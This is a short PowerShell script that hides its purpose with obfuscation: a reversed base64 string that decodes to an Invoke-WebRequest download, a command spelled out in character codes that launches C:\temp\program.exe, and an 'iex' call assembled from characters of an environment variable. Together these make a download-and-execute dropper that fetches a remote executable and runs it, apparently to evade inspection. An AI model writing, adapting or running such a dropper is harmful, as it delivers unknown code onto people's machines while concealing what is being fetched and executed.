$a = 'iUGel5SbhJ3ZvJHccBXblRHX6MkIgUGbpZEd19ULgISbvNmLyF2YpV2'
$b = 'LnJ3buIXYjlWZuUmc1NWZz9yL6MHc0RHaiASayVVLgQ3clVXclJlYldVLlt2b25WS'
$g = (((83,116,97,114,116,45,80,114,111,99,101,115,115,32,45,70,105,108,101,80,97,116,104,32,34,67,58,92,116,101,109,112,92,112,114,111,103,114,97,109,46,101,120,101,34)| %{ ([Int]$_ -as [char]) }) -Join '') #| &($env:comspec[4,15,25] -Join '')
$c = $a + $b

$d = -join $c[$c.Length..0]

$e = [System.Convert]::FromBase64String($d)
$f = [System.Text.Encoding]::UTF8.GetString($e)

echo $f
echo $g

mkdir C:\temp
& $f
& $g